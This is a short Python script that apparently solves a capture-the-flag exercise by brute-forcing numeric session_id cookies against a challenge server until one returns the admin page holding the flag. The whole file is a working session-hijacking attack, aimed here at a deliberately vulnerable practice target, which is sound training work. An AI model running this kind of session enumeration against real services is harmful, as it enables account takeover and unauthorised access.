import requests

# this script solves the exercise
# it tries all session_ids to find the admin session_id

url = "http://vuln.redrocket.club:1921/"

for i in range(-1219, 1220):
    cookies = {'session_id': str(i)}
    r = requests.get(url, cookies=cookies)
    if "flag{" in r.text:
        flag = "flag found in session_id: " + str(i)
        print(flag)
        exit()